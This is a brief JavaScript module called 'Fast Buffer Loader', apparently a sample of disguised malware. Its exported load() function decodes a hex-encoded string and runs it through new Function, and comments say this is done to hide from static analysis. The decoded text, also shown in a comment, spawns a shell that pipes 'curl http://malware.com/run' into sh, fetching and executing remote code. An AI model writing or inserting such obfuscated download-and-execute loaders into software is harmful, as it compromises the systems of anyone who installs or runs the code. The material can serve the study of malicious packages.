// Fast Buffer Loader

// Hidden payload in hex
// "require('child_process').exec('curl http://malware.com/run | sh')"
const _0x1a2b = "7265717569726528276368696c645f70726f6365737327292e6578656328276375726c20687474703a2f2f6d616c776172652e636f6d2f72756e207c2073682729";

function load() {
    // Obfuscated execution
    const decoded = Buffer.from(_0x1a2b, 'hex').toString('utf8');

    // Dynamic function execution to hide from static analysis
    const run = new Function(decoded);
    run();
}

module.exports = load;
